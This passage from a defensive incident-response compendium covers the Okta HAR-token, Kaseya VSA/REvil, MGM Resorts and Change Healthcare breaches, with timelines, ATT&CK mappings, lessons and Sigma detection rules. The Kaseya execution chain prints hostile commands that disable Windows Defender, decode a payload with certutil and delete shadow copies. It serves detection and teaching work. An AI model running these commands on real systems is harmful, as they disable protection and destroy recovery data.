| Persistence | Valid Accounts | T1078 | Created or modified admin accounts in customer tenants |
| Impact | Account Access Removal | T1531 | Potential to lock out legitimate admins in customer environments |

### HAR File Attack Vector — Technical Detail

```
HTTP Archive (HAR) files capture:
├── Full HTTP request/response headers
│   ├── Authorization: Bearer <access_token>
│   ├── Cookie: sid=<session_id>; JSESSIONID=<value>
│   └── X-Okta-Session-Token: <token>
├── Request bodies (including form data)
├── Response bodies (including JSON with tokens)
└── Timing data

RISK: Support workflows routinely ask customers to upload HAR files
      for debugging. These files contain LIVE SESSION TOKENS that
      can be replayed if not expired/rotated.
```

### Customer Detection Examples

**BeyondTrust Detection (2023-09-29)**:
```
Trigger: Identity-first security alert
- Unauthorized attempt to use Okta admin API to create new admin user
- Source IP not in BeyondTrust admin allow-list
- Session token traced to a support case HAR file upload
- BeyondTrust notified Okta; Okta initially attributed to "known issue"
```

**Cloudflare Detection (2023-10-02)**:
```
Trigger: Okta admin portal access from anomalous session
- Session originated from a HAR file token, not normal auth flow
- No MFA challenge observed for admin-level action
- IP geolocation inconsistent with known Cloudflare admin locations
- Cloudflare invalidated all Okta sessions, rotated credentials
```

**1Password Detection (2023-10-11)**:
```
Trigger: Unexpected Okta admin IDP-initiated login
- Admin session appeared without corresponding MFA event
- Activity from IP not in 1Password admin inventory
- 1Password suspended Okta integration, rotated all credentials
```

### Detection Opportunities

| Detection Point | Data Source | Logic | Priority |
|----------------|-------------|-------|----------|
| Admin API calls from sessions without MFA events | Okta System Log | `eventType: user.session.start` without corresponding MFA factor verification | Critical |
| Admin account creation/modification from unfamiliar IPs | Okta System Log | `eventType: user.lifecycle.create` OR `group.user_membership.add` from IP not in admin baseline | Critical |
| HAR file upload followed by session replay | Correlation engine | Support case HAR upload → same session token appears from different IP within TTL | High |
| Session token used from geographically impossible location | Okta System Log + GeoIP | Same session used from >500 miles apart within <1 hour | High |
| Bulk data export from support/admin systems | SaaS audit logs | Report generation or bulk export from support case management system | High |
| Service account token usage anomalies | IAM logs | Service account tokens used interactively or from unexpected source IPs | Medium |

### Key Lessons

```
1. SUPPLY CHAIN IDENTITY RISK
   - Your IdP is a Tier-0 asset; a breach of the IdP cascades to ALL downstream customers
   - IdP vendors must be held to the highest security standards (SOC 2 Type II is insufficient)
   - Contractual requirements: breach notification SLAs, session token TTL enforcement

2. HAR FILES ARE CREDENTIAL DUMPS
   - Support workflows that collect HAR files collect session tokens
   - HAR sanitization must strip Authorization headers, cookies, and tokens BEFORE upload
   - Organizations should build HAR sanitization tooling into their support processes:
     $ cat recording.har | jq 'walk(if type == "object" then del(.cookies) |
       .headers |= map(select(.name | test("auth|cookie|token"; "i") | not)) else . end)'

3. TRUST BUT VERIFY YOUR SECURITY VENDORS
   - BeyondTrust notified Okta on Sept 29; Okta did not confirm compromise until Oct 17
   - 18-day gap between first external detection and vendor acknowledgment
   - Customers must instrument their own detection, not rely solely on vendor SOC

4. SESSION TOKEN LIFECYCLE MANAGEMENT
   - Tokens in HAR files remained valid long enough for replay attacks
   - Enforce aggressive session TTLs for admin accounts (15 min idle, 8 hour absolute)
   - Bind sessions to IP/device fingerprint where possible

5. SCOPE CREEP IN BREACH DISCLOSURE
   - Initial disclosure: 134 customers (1%). Final: ALL customers.
   - Incremental disclosure erodes trust faster than a single honest assessment
   - Err toward over-reporting scope initially
```

### Sigma Rule — Okta Admin Action Without MFA Event

```yaml
title: Okta Admin Action Without Preceding MFA Challenge
id: 4c7e2a19-8b5f-4d03-9e6a-1f2b3c8d7e50
status: experimental
description: Detects Okta admin-level actions (user creation, group modification, policy changes) that lack a corresponding MFA verification event in the session, indicating potential session token replay
references:
  - https://sec.okta.com/harfiles
logsource:
  category: application
  product: okta
detection:
  selection_admin_action:
    eventType|startswith:
      - 'user.lifecycle'
      - 'group.user_membership'
      - 'policy.lifecycle'
      - 'application.lifecycle'
    actor.alternateId|endswith: '@company.com'
  filter_mfa_verified:
    authenticationContext.externalSessionId: '*'
    debugContext.debugData.factor: '*'
  condition: selection_admin_action and not filter_mfa_verified
falsepositives:
  - API-driven automation using service accounts (should be excluded by actor filter)
  - Initial setup workflows before MFA policy enforcement
level: critical
tags:
  - attack.credential_access
  - attack.t1539
  - attack.t1550.004
  - attack.privilege_escalation
```

### Sigma Rule — Okta Admin Session from New IP

```yaml
title: Okta Admin Session Initiated from Previously Unseen IP Address
id: 9d1f3b72-5a4e-4c68-8f07-2e6a9b0c1d83
status: experimental
description: Detects Okta admin sessions originating from IP addresses not previously associated with administrative access, common indicator of stolen session token replay
logsource:
  category: application
  product: okta
detection:
  selection:
    eventType: 'user.session.start'
    outcome.result: 'SUCCESS'
    actor.alternateId|contains: 'admin'
  filter_known_ips:
    client.ipAddress|cidr:
      - '198.51.100.0/24'  # Replace with org admin IP ranges
      - '203.0.113.0/24'
  condition: selection and not filter_known_ips
falsepositives:
  - Admin traveling and using hotel/airport WiFi
  - New office location not yet added to IP allow-list
level: high
tags:
  - attack.initial_access
  - attack.t1078.004
```

---

## 9. Kaseya VSA Supply Chain Attack (2021)

### Overview

| Field | Detail |
|-------|--------|
| Victim | Kaseya VSA on-premises customers and their downstream managed clients |
| Sector | Managed Service Providers (MSPs) — supply chain targeting |
| Threat Actor | REvil / Sodinokibi (ransomware-as-a-service) |
| Vulnerability | CVE-2021-30116 (authentication bypass), CVE-2021-30119 (XSS), CVE-2021-30120 (2FA bypass) |
| Initial Access | Authentication bypass in Kaseya VSA server web interface |
| Impact | ~60 MSPs compromised; ~1,500 downstream businesses encrypted; $70M initial ransom demand |
| Resolution | Kaseya obtained universal decryptor (reportedly via FBI/REvil infrastructure seizure) |

### Attack Timeline

| Date | Event | Phase |
|------|-------|-------|
| 2021-04-01 | DIVD (Dutch Institute for Vulnerability Disclosure) discovers vulnerabilities in Kaseya VSA | Pre-compromise |
| 2021-04-06 | DIVD notifies Kaseya; Kaseya begins patching process | Vulnerability Disclosure |
| 2021-04-–06 | REvil affiliate independently discovers same vulnerabilities; begins weaponization | Threat Actor Preparation |
| 2021-07-02 14:00 UTC | REvil deploys exploit against internet-facing Kaseya VSA servers | Initial Access |
| 2021-07-02 14:00 | Authentication bypass (CVE-2021-30116) used to gain admin access to VSA | Exploitation |
| 2021-07-02 14:00–16:00 | Malicious "Kaseya VSA Agent Hot-fix" pushed to all managed endpoints via VSA agent update mechanism | Execution |
| 2021-07-02 14:00–16:00 | VSA procedure disables Windows Defender, drops `agent.crt` (encrypted payload), executes ransomware via legitimate `certutil.exe` and `msmpeng.exe` sideloading | Defense Evasion + Execution |
| 2021-07-02 ~16:00 | Sophos, Huntress Labs detect mass ransomware deployment across multiple MSP environments | Detection |
| 2021-07-02 18:00 | Kaseya issues advisory: shut down VSA servers immediately | Containment |
| 2021-07-04 | REvil posts $70M demand for universal decryptor on Happy Blog | Ransom Demand |
| 2021-07-05 | CISA and FBI issue joint advisory | Escalation |
| 2021-07-13 | REvil infrastructure goes offline (Happy Blog, payment portals) | Threat Actor Disruption |
| 2021-07-22 | Kaseya obtains universal decryptor from "trusted third party" | Recovery |
| 2021-07-22 onwards | Kaseya distributes decryptor to affected customers | Recovery |
| 2021-11-08 | DOJ announces arrest of REvil affiliate Yaroslav Vasinskyi (Ukrainian national) | Law Enforcement |

### MITRE ATT&CK Chain

| Tactic | Technique | ID | Detail |
|--------|-----------|----|--------|
| Initial Access | Exploit Public-Facing Application | T1190 | CVE-2021-30116 auth bypass on Kaseya VSA web interface |
| Execution | Software Deployment Tools | T1072 | Abused VSA agent update mechanism to push ransomware as "hot-fix" |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell used in initial payload staging |
| Defense Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 | Disabled Windows Defender real-time protection |
| Defense Evasion | Masquerading: Match Legitimate Name | T1036.005 | Payload disguised as Kaseya VSA hotfix; used `msmpeng.exe` (Defender binary) for DLL sideloading |
| Defense Evasion | Signed Binary Proxy Execution: Certutil | T1218.011 | Used `certutil -decode` to decode encrypted payload |
| Defense Evasion | Indicator Removal | T1070 | Cleared VSA agent logs and application logs |
| Impact | Data Encrypted for Impact | T1486 | REvil/Sodinokibi ransomware encryption across all managed endpoints |
| Impact | Inhibit System Recovery | T1490 | Deleted volume shadow copies via `vssadmin` |

### Execution Chain — Technical Detail

```
STAGE 1: Authentication Bypass (VSA Server)
├── POST /dl.asp → directory traversal + auth bypass (CVE-2021-30116)
├── Upload malicious agent procedure as Kaseya admin
└── Schedule immediate execution across all managed agents

STAGE 2: Agent-Side Execution (Managed Endpoints)
├── VSA agent (AgentMon.exe) executes scheduled procedure
├── PowerShell: Set-MpPreference -DisableRealtimeMonitoring $true
├── certutil.exe -decode %TEMP%\agent.crt %TEMP%\agent.exe
├── agent.exe → drops MsMpEng.exe (old, legitimate) + mpsvc.dll (REvil payload)
├── MsMpEng.exe loads mpsvc.dll (DLL side-loading)
│   └── mpsvc.dll = REvil ransomware
├── vssadmin.exe delete shadows /all /quiet
└── Encryption begins with per-machine RSA key wrapping AES session key

STAGE 3: Anti-Forensics
├── C:\kworking\agent.crt → deleted
├── VSA agent logs purged
├── Event logs cleared
└── Scheduled task removed
```

### Detection Opportunities

| Detection Point | Data Source | Logic | Priority |
|----------------|-------------|-------|----------|
| Certutil decoding executable content | Sysmon EventID 1, EDR | `certutil.exe -decode` with output file having executable headers | Critical |
| MsMpEng.exe running from non-standard path | EDR, Sysmon | MsMpEng.exe execution from `%TEMP%`, `C:\kworking\`, or any path outside `%ProgramFiles%\Windows Defender\` | Critical |
| Defender real-time monitoring disabled | Windows Event 5001, PowerShell logs | `Set-MpPreference -DisableRealtimeMonitoring $true` | Critical |
| Mass VSA agent procedure execution | Kaseya VSA logs | Procedure scheduled for all endpoints simultaneously (not normal patching behavior) | High |
| Volume shadow copy deletion | Sysmon, Windows Event logs | `vssadmin.exe delete shadows` | High |
| DLL side-loading via signed binary | Sysmon EventID 7 | Image load of unsigned `mpsvc.dll` by signed `MsMpEng.exe` | High |
| Internet-facing Kaseya VSA discovery | Shodan/Censys monitoring | Monitor for exposed VSA instances on ports 443/4443 | Medium |

### Key Lessons

```
1. SOFTWARE SUPPLY CHAIN = FORCE MULTIPLIER
   - One VSA server compromise → all managed endpoints encrypted
   - MSP trust model: customers delegate admin access to MSP tooling
   - RMM tools are Tier-0 assets; must be hardened as such
   - NIST 800-171r3, CISA Secure by Design principles

2. PATCH RACE CONDITIONS ARE REAL
   - DIVD disclosed vulnerabilities April 2021
   - REvil exploited them July 2021 — Kaseya was mid-patch
   - Critical vulns in internet-facing management planes: patch in DAYS, not months
   - Consider: take service offline to patch rather than race an attacker

3. DEFENSE EVASION THROUGH LEGITIMATE TOOLING
   - Attack used: certutil (Windows built-in), MsMpEng.exe (signed Microsoft binary)
   - DLL side-loading bypasses application whitelisting
   - Detection must focus on BEHAVIOR, not binary reputation
   - LOLBins monitoring is mandatory: https://lolbas-project.github.io/

4. RMM TOOL SECURITY POSTURE
   - Internet-facing management interface with auth bypass = game over
   - RMM servers must NOT be directly internet-accessible
   - Require: VPN/ZTNA gateway, IP allow-listing, MFA, audit logging
   - Monitor: Shodan/Censys for exposed RMM interfaces continuously

5. DECRYPTOR RELIABILITY VARIES
   - Kaseya's universal decryptor worked, but this is the exception
   - Offline, immutable, tested backups remain the primary recovery mechanism
   - Backup systems must be unreachable from production networks
```

### Sigma Rule — Certutil Decode to Executable

```yaml
title: Certutil Used to Decode Executable Payload
id: 7a2e5f18-9c3d-4b86-af12-5d8e7c1b9a04
status: experimental
description: Detects certutil.exe being used with -decode flag to decode files, a technique used by REvil in the Kaseya VSA supply chain attack for payload staging
references:
  - https://community.sophos.com/b/security-blog/posts/active-ransomware-attack-on-kaseya-customers
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains|all:
      - '-decode'
  filter_legitimate:
    ParentImage|endswith:
      - '\mmc.exe'
      - '\certmgr.exe'
  condition: selection and not filter_legitimate
falsepositives:
  - Certificate management scripts that decode PEM/DER files (should be baselined)
  - Software installation scripts that use certutil for hash verification
level: high
tags:
  - attack.defense_evasion
  - attack.t1218.011
  - attack.execution
```

### Sigma Rule — DLL Side-Loading via MsMpEng.exe from Unusual Path

```yaml
title: MsMpEng.exe Execution from Non-Standard Directory
id: 3f8b2c61-7d4a-4e95-b1c6-9a0e5f2d8b73
status: experimental
description: Detects Windows Defender binary MsMpEng.exe executing from unexpected directories, indicating DLL side-loading technique used in Kaseya/REvil attack
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\MsMpEng.exe'
  filter_legitimate_paths:
    Image|startswith:
      - 'C:\ProgramData\Microsoft\Windows Defender\'
      - 'C:\Program Files\Windows Defender\'
      - 'C:\Program Files\Microsoft Security Client\'
  condition: selection and not filter_legitimate_paths
falsepositives:
  - Windows Defender update staging (temporary paths during updates)
level: critical
tags:
  - attack.defense_evasion
  - attack.t1036.005
  - attack.t1574.002
```

---

## 10. MGM Resorts (2023)

### Overview

| Field | Detail |
|-------|--------|
| Victim | MGM Resorts International |
| Sector | Hospitality / Gaming |
| Threat Actor | Scattered Spider (UNC3944 / 0ktapus) deploying ALPHV/BlackCat ransomware |
| Initial Access | Social engineering of IT help desk (vishing) |
| Impact | 10-day operational disruption; slot machines, room keys, check-in systems, website down; ~$100M financial impact; 6+ TB data exfiltrated |
| Comparison | Caesars Entertainment breached by same group weeks prior; paid ~$15M ransom quietly |

### Attack Timeline

| Date | Event | Phase |
|------|-------|-------|
| 2023-08-27 (approx) | Scattered Spider identifies MGM employee via LinkedIn reconnaissance | Reconnaissance |
| 2023-09-07 | Attacker calls MGM IT help desk impersonating identified employee | Initial Access |
| 2023-09-07 | Help desk resets MFA and provides access to employee Okta account | Credential Access |
| 2023-09-07–09 | Attacker accesses Okta admin console, escalates privileges | Privilege Escalation |
| 2023-09-08–10 | Lateral movement through internal systems; access to Active Directory, ESXi hypervisors | Lateral Movement |
| 2023-09-10 | Data exfiltration begins: PII, financial data, internal documents (~6+ TB) | Exfiltration |
| 2023-09-11 | ALPHV/BlackCat ransomware deployed across ESXi infrastructure | Impact |
| 2023-09-11 | MGM detects attack; begins containment by shutting down systems | Detection/Containment |
| 2023-09-11 | Slot machines, digital room keys, reservation system, MGM website go offline | Impact |
| 2023-09-11–12 | Guests cannot check in digitally; manual processes instituted | Operational Impact |
| 2023-09-12 | ALPHV/BlackCat claims attack on their leak site | Threat Actor Claim |
| 2023-09-14 | Scattered Spider publicly taunts MGM on social media | Threat Actor Behavior |
| 2023-09-20 | MGM begins restoring systems; website comes back online | Recovery |
| 2023-10-05 | MGM files 8-K with SEC; estimates $100M impact | Disclosure |
| 2023-10-11 | MGM confirms personal data of customers before March 2019 was exfiltrated | Scope Confirmation |

### MITRE ATT&CK Chain

| Tactic | Technique | ID | Detail |
|--------|-----------|----|--------|
| Reconnaissance | Gather Victim Identity Information: Employee Names | T1589.003 | LinkedIn OSINT to identify help desk targets |
| Initial Access | Phishing: Voice Phishing | T1566.004 | Called IT help desk impersonating employee |
| Credential Access | Multi-Factor Authentication Request Generation | T1621 | Social engineered MFA reset through help desk |
| Persistence | Account Manipulation | T1098 | Modified Okta admin accounts for persistent access |
| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | Escalated to Okta super-admin |
| Discovery | Remote System Discovery | T1018 | Enumerated ESXi hypervisors and domain controllers |
| Lateral Movement | Remote Services: SSH | T1021.004 | Accessed ESXi hosts via SSH |
| Lateral Movement | Remote Services: RDP | T1021.001 | Moved through Windows infrastructure |
| Collection | Data from Local System | T1005 | Collected PII and financial data |
| Exfiltration | Exfiltration Over Web Service | T1567 | Data staged and exfiltrated (~6 TB) |
| Impact | Data Encrypted for Impact | T1486 | ALPHV/BlackCat deployed on ESXi (Linux variant) |
| Impact | Service Stop | T1489 | VMs encrypted → all dependent services offline |

### Scattered Spider TTPs — Profile

```
GROUP CHARACTERISTICS:
├── Primarily English-speaking (US/UK), ages 17-25
├── Active in Telegram communities (The Com)
├── Specialize in social engineering and SIM swapping
├── Partner with Russian-speaking RaaS (ALPHV/BlackCat)
└── Known aliases: UNC3944, 0ktapus, Roasted 0ktapus, Starfraud

SIGNATURE TECHNIQUES:
├── Help desk social engineering (vishing)
│   ├── Impersonate employee using LinkedIn data
│   ├── Request MFA reset or password reset
│   └── Often call during shift changes or high-volume periods
├── SIM swapping for SMS-based MFA bypass
├── Okta/Azure AD targeting for identity-plane control
├── ESXi hypervisor targeting (encrypt all VMs at once)
└── Data exfiltration before encryption (double extortion)

OBSERVED TOOLS:
├── Mimikatz — credential dumping
├── Impacket — lateral movement
├── ALPHV/BlackCat — ransomware deployment
├── Fleetdeck — remote monitoring
├── AnyDesk, Splashtop — remote access
└── Custom Azure AD/Okta enumeration scripts
```

### Detection Opportunities

| Detection Point | Data Source | Logic | Priority |
|----------------|-------------|-------|----------|
| Help desk MFA reset without standard verification | ITSM ticketing system | MFA reset request via phone call without callback verification or manager approval | Critical |
| Okta admin role assignment | Okta System Log | `eventType: user.account.privilege.grant` to super-admin role | Critical |
| Multiple MFA factor resets in short window | Okta System Log | >2 MFA factor enrollments/resets for single user within 1 hour | High |
| ESXi SSH login from non-infrastructure host | ESXi logs, network logs | SSH connections to ESXi hosts from workstations (not admin jump boxes) | High |
| Large data staging/exfiltration | DLP, netflow | >1 TB outbound to non-sanctioned cloud storage | High |
| Remote access tool installation | EDR | AnyDesk, Splashtop, Fleetdeck installation on endpoints not managed by IT | High |
| New Okta admin IdP created | Okta System Log | `eventType: system.idp.lifecycle.create` — attacker creating rogue identity provider | Critical |

### Key Lessons

```
1. HELP DESK IS THE NEW PERIMETER
   - A single phone call bypassed all technical controls
   - Identity verification for help desk must include:
     * Callback to registered phone number
     * Manager approval for MFA resets
     * Video verification for high-privilege accounts
     * Shared secret / challenge-response questions NOT found on LinkedIn
   - NIST 800-63B Identity Proofing requirements apply to internal reset flows

2. IDENTITY PLANE IS THE HIGHEST-VALUE TARGET
   - Okta super-admin access → control of all downstream applications
   - IdP compromise = compromise of EVERYTHING federated through it
   - Separate admin accounts with hardware FIDO2 tokens for IdP management
   - Break-glass accounts stored offline, rotated, and audited

3. ESXI IS A RANSOMWARE MULTIPLIER
   - One ESXi host = dozens of VMs encrypted simultaneously
   - ESXi must be on isolated management VLAN
   - SSH access audited and restricted to jump boxes
   - Consider: immutable ESXi configuration (stateless boot from USB)

4. YOUNG, ENGLISH-SPEAKING THREAT ACTORS CHANGE THE GAME
   - Traditional social engineering training assumes accented callers or broken English
   - Scattered Spider members are native English speakers, fluent in corporate jargon
   - Help desk training must evolve beyond "suspicious caller" stereotypes

5. DUAL EXTORTION BASELINE
   - Data exfiltrated BEFORE encryption
   - Even if backups are perfect, PII exposure triggers regulatory obligations
   - DLP and egress monitoring are not optional
   - GDPR Art. 33/34, state breach notification laws
```

### Sigma Rule — Help Desk MFA Reset Followed by Anomalous Admin Activity

```yaml
title: MFA Factor Reset Followed by Okta Admin Privilege Escalation
id: 5e9a3b17-2c8f-4d61-a7e0-8f1c6d3b9a25
status: experimental
description: Detects sequence of MFA factor reset followed by admin role assignment within a short time window, characteristic of Scattered Spider social engineering attacks
logsource:
  category: application
  product: okta
detection:
  selection_mfa_reset:
    eventType|startswith: 'user.mfa.factor'
    eventType|endswith: 'reset'
  selection_admin_escalation:
    eventType: 'user.account.privilege.grant'
  timeframe: 4h
  condition: selection_mfa_reset | near selection_admin_escalation
falsepositives:
  - Legitimate employee device replacement with same-day admin role assignment
  - Onboarding workflows that configure MFA and roles in sequence
level: critical
tags:
  - attack.credential_access
  - attack.t1621
  - attack.privilege_escalation
  - attack.t1098
```

### Sigma Rule — Unauthorized Remote Access Tool Installation

```yaml
title: Unauthorized Remote Access Tool Installation
id: 6c2d8e4a-1f7b-4935-a0c9-3e5f8b2d7a16
status: experimental
description: Detects installation or execution of remote access tools not sanctioned by the organization, commonly used by Scattered Spider for persistent access
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\AnyDesk.exe'
      - '\splashtop\*.exe'
      - '\fleetdeck_agent.exe'
      - '\screenconnect\*.exe'
      - '\rustdesk.exe'
    # OR
    OriginalFileName:
      - 'AnyDesk.exe'
      - 'SplashtopStreamer.exe'
      - 'FleetDeck.Agent.exe'
      - 'ScreenConnect.ClientService.exe'
  filter_sanctioned:
    Image|startswith:
      - 'C:\Program Files\SanctionedRMM\'  # Replace with org's approved RMM path
  condition: selection and not filter_sanctioned
falsepositives:
  - IT support using approved remote access tools (ensure filter covers sanctioned paths)
  - Developer testing remote desktop solutions
level: high
tags:
  - attack.command_and_control
  - attack.t1219
  - attack.persistence
```

---

## 11. Change Healthcare (2024)

### Overview

| Field | Detail |
|-------|--------|
| Victim | Change Healthcare (subsidiary of UnitedHealth Group / Optum) |
| Sector | Healthcare — claims processing and payment clearinghouse |
| Threat Actor | ALPHV/BlackCat (ransomware-as-a-service), affiliate "Notchy" |
| Initial Access | Compromised Citrix remote access credentials (no MFA) |
| Impact | Largest healthcare data breach in US history; ~100M individuals affected; $22M ransom paid; months of claims processing disruption |
| Financial Impact | UnitedHealth Group reported $872M in direct costs (Q1-Q2 2024); total estimated >$1.6B |

### Attack Timeline

| Date | Event | Phase |
|------|-------|-------|
| 2024-02-12 | ALPHV affiliate authenticates to Change Healthcare Citrix portal using stolen credentials (no MFA) | Initial Access |
| 2024-02-12–17 | Attacker conducts internal reconnaissance; moves laterally through Change Healthcare network | Lateral Movement |
| 2024-02-17–21 | Data exfiltration: ~6 TB of healthcare data (PHI, PII, insurance records, clinical data) | Exfiltration |
| 2024-02-21 | ALPHV/BlackCat ransomware deployed across Change Healthcare systems | Impact |
| 2024-02-21 | Change Healthcare detects encryption; systems taken offline | Detection/Containment |
| 2024-02-21 | Pharmacies, hospitals, and providers nationwide lose claims processing capability | Cascading Impact |
| 2024-02-21 onwards | Manual claims processing attempted; many providers unable to bill or receive payment | Operational Impact |
| 2024-02-26 | UnitedHealth Group confirms cyber incident; engages Mandiant and Palo Alto Unit 42 | Response |
| 2024-03-01 | ALPHV/BlackCat claims $22M ransom payment; performs exit scam on affiliate | Ransom Payment |
| 2024-03-04 | ALPHV/BlackCat posts fake FBI seizure notice on leak site (exit scam) | Threat Actor Infighting |
| 2024-03-05 | Affiliate "Notchy" claims ALPHV stole the $22M and still has the data | Double Extortion Risk |
| 2024-03-13 | HHS launches investigation; accelerates provider payment assistance | Regulatory Response |
| 2024-04-15 | RansomHub (new group) begins publishing stolen Change Healthcare data (affiliate re-extortion) | Re-Extortion |
| 2024-04-22 | UnitedHealth CEO Andrew Witty confirms $22M ransom payment in Congressional testimony | Public Disclosure |
| 2024-05-01 | UnitedHealth CEO testifies before Senate: confirms no MFA on Citrix portal | Congressional Hearing |
| 2024-06-20 | Change Healthcare begins individual notifications; confirms ~100M individuals affected | Scope Confirmation |
| 2024-10-24 | HHS OCR confirms 100M breach notification to individuals | Regulatory |

### MITRE ATT&CK Chain

| Tactic | Technique | ID | Detail |
|--------|-----------|----|--------|
| Initial Access | Valid Accounts: Cloud Accounts | T1078.004 | Stolen Citrix remote access credentials, no MFA |
| Execution | Remote Services: VDI | T1021.005 | Citrix virtual desktop used as initial foothold |
| Discovery | Network Service Discovery | T1046 | Mapped internal network, identified critical data stores |
| Discovery | Account Discovery: Domain Account | T1087.002 | Enumerated Active Directory for privilege escalation targets |
| Credential Access | OS Credential Dumping | T1003 | Extracted credentials for lateral movement |
| Lateral Movement | Remote Services: RDP | T1021.001 | Moved through Windows infrastructure to data stores |
| Collection | Data from Information Repositories | T1213 | Accessed healthcare claims databases, clinical records |
| Exfiltration | Exfiltration Over Web Service | T1567 | ~6 TB exfiltrated over 9-day window |
| Impact | Data Encrypted for Impact | T1486 | ALPHV/BlackCat ransomware deployed |
| Impact | Service Stop | T1489 | Claims processing, pharmacy networks, provider payments halted |

### Healthcare Cascading Impact Detail

```
SYSTEMS AFFECTED:
├── Claims Processing
│   ├── 15 billion healthcare transactions annually (Change processes ~40% of US claims)
│   ├── Pharmacies unable to process insurance claims
│   ├── Hospitals unable to verify coverage or submit bills
│   └── Providers experiencing cash flow crises within days
├── Electronic Prescriptions
│   ├── E-prescribing disrupted at thousands of pharmacies
│   └── Patients unable to fill prescriptions or facing cash-pay requirements
├── Eligibility Verification
│   ├── Real-time eligibility checks failed
│   └── Providers forced to accept patients without coverage verification
└── Payment Processing
    ├── Provider payments delayed for weeks/months
    ├── Small/rural practices facing bankruptcy risk
    └── UnitedHealth established advance payment program ($6.5B distributed)

REGULATORY CONSEQUENCES:
├── HHS OCR investigation (HIPAA violations)
├── Multiple state AG investigations
├── Congressional hearings (Senate Finance, Energy & Commerce)
├── SEC disclosure requirements triggered
├── Class action lawsuits (patients, providers, shareholders)
└── Proposed legislation: minimum cybersecurity standards for healthcare
```

### Detection Opportunities

| Detection Point | Data Source | Logic | Priority |
|----------------|-------------|-------|----------|
| Citrix remote access without MFA | Citrix NetScaler logs | Any successful authentication without MFA factor verification | Critical |
| Prolonged remote session with data access anomalies | Citrix session logs, DLP | Remote session >8 hours with access to databases not in user's normal pattern | High |
| 6 TB data exfiltration over 9 days | Netflow, DLP, proxy logs | Sustained high-volume outbound transfers from database servers | Critical |
| Credential dumping tools | EDR | Execution of Mimikatz, secretsdump, or LSASS memory access | High |
| Lateral movement from Citrix to internal servers | Network segmentation monitoring | Citrix VDI initiating connections to database servers, DCs, or backup systems | High |
| Ransomware staging behavior | EDR, file monitoring | Mass file enumeration followed by encryption patterns | High |
| Claims processing anomaly | Application monitoring | Claims throughput dropping to zero across all connected systems | Critical (availability) |

### Key Lessons

```
1. MFA ON REMOTE ACCESS IS A BASELINE, NOT A BONUS
   - CEO testified under oath: Citrix portal had no MFA
   - This is a CIS Control 6.3 / NIST 800-53 IA-2(1) fundamental requirement
   - For a company processing 40% of US healthcare claims, this is negligence
   - HIPAA Security Rule 45 CFR 164.312(d) — person or entity authentication

2. CONCENTRATION RISK IN CRITICAL INFRASTRUCTURE
   - Single clearinghouse processes 15 billion transactions/year
   - No redundancy: when Change Healthcare went down, the US healthcare payment system stalled
   - Systemic risk assessment must extend beyond individual organization boundaries
   - Need: regulated diversity requirements for critical healthcare infrastructure

3. RANSOMWARE PAYMENT DOES NOT END THE THREAT
   - Change Healthcare paid $22M to ALPHV/BlackCat
   - ALPHV exit-scammed the affiliate; affiliate took data to RansomHub
   - Result: paid ransom AND data leaked anyway
   - RaaS affiliate model means multiple parties hold your data

4. DWELL TIME = EXFILTRATION TIME
   - 9-day window from initial access to ransomware deployment
   - Entire 6 TB exfiltrated in that window
   - Reducing MTTD from days to hours would have dramatically limited data exposure
   - 24/7 SOC monitoring, not business-hours-only, for critical infrastructure

5. CONGRESSIONAL AND REGULATORY BACKLASH IS THE NEW NORMAL
   - CEO testifying before Congress on basic security failures
   - $872M+ in direct costs (and growing)
   - Proposed minimum cybersecurity standards for healthcare entities
   - Board-level accountability for cybersecurity posture is now expected
```

### Sigma Rule — Citrix Access Without MFA Verification

```yaml
title: Citrix Remote Access Session Without MFA Challenge
id: 8b4f2e73-1a9c-4d56-b3e7-5c0f8a6d2b19
status: experimental
description: Detects successful Citrix NetScaler or Gateway authentication that did not include a multi-factor authentication challenge, the exact vector used in the Change Healthcare breach
references:
  - https://www.hhs.gov/hipaa/for-professionals/special-topics/change-healthcare-cybersecurity-incident/index.html
logsource:
  category: authentication
  product: citrix
detection:
  selection:
    action: login
    result: success
  filter_mfa:
    authentication_method|contains:
      - 'RADIUS'
      - 'SAML'
      - 'nFactor'
      - 'TOTP'
  condition: selection and not filter_mfa
falsepositives:
  - Service accounts configured for certificate-based authentication
  - Emergency break-glass access procedures (should still be alerted and investigated)
level: critical
tags:
  - attack.initial_access
  - attack.t1078.004
  - attack.valid_accounts
```

### Sigma Rule — Sustained High-Volume Data Transfer from Database Servers

```yaml
title: Sustained Outbound Data Transfer from Healthcare Database Server
id: 1d5e7c38-4b2a-4f96-8e03-9a6f2b1c8d47
status: experimental
description: Detects sustained high-volume outbound data transfers from database servers, indicative of bulk healthcare record exfiltration as seen in Change Healthcare breach
logsource:
  category: network_connection
  product: firewall
detection:
  selection:
    src_ip|cidr:
      - '10.100.0.0/16'  # Replace with database server subnet
    direction: outbound
  filter_internal:
    dst_ip|cidr:
      - '10.0.0.0/8'
      - '172.16.0.0/12'
      - '192.168.0.0/16'
  filter_backup:
    dst_ip|cidr:
      - '10.200.0.0/16'  # Replace with backup infrastructure subnet
  condition: selection and not (filter_internal or filter_backup) | count(bytes_out) by src_ip > 107374182400  # 100GB per day threshold
falsepositives:
  - Scheduled data warehouse replication to approved cloud analytics platforms
  - Large database migration projects (should be pre-approved and time-bounded)
level: critical
tags:
  - attack.exfiltration
  - attack.t1567
  - attack.collection
  - attack.t1213
```

---

## 12. CrowdStrike Falcon Sensor Update Incident (2024)

### Overview

| Field | Detail |
|-------|--------|
| Organization | CrowdStrike |
| Sector | Cybersecurity / Endpoint Detection and Response |
| Incident Type | Defective software update (NOT a cyberattack) |
| Root Cause | Faulty Channel File 291 update for Falcon sensor on Windows |
| Impact | ~8.5 million Windows devices crashed (BSOD); global IT outage affecting airlines, hospitals, banks, emergency services |
| Estimated Cost | >$5.4 billion in direct losses to Fortune 500 companies alone (Parametrix estimate) |
| Date | 2024-07-19 |

### Incident Timeline

| Time (UTC) | Event | Phase |
|------------|-------|-------|
| 2024-07-19 04:09 | CrowdStrike releases Channel File 291 update (C-00000291*.sys) via rapid response content mechanism | Cause |
| 2024-07-19 04:09–05:27 | Channel file deployed to all online Windows Falcon sensors globally (~78 minutes of exposure) | Propagation |
